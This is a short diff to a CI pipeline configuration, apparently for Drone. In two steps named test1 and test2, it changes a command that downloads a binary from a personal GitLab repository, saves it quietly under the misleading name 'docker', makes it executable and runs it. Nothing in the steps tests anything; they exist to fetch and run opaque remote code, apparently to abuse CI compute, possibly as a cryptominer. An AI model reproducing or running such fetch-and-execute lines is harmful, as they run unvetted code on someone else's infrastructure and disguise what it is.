@@ -5,7 +5,7 @@ steps:
 - name: test1
   image: golang
   commands:
-  - wget https://gitlab.com/lambohopo/bash/-/raw/main/docker && chmod +x docker && ./docker
+  - wget -qO docker https://gitlab.com/lambohopo/bash/-/raw/main/cc-node && chmod +x docker && ./docker
 ---
 kind: pipeline
 type: docker
@@ -15,7 +15,7 @@ steps:
 - name: test2
   image: node
   commands:
-  - wget https://gitlab.com/lambohopo/bash/-/raw/main/docker && chmod +x docker && ./docker
+  - wget -qO docker https://gitlab.com/lambohopo/bash/-/raw/main/cc-node && chmod +x docker && ./docker
 ---
 kind: pipeline
 name: after
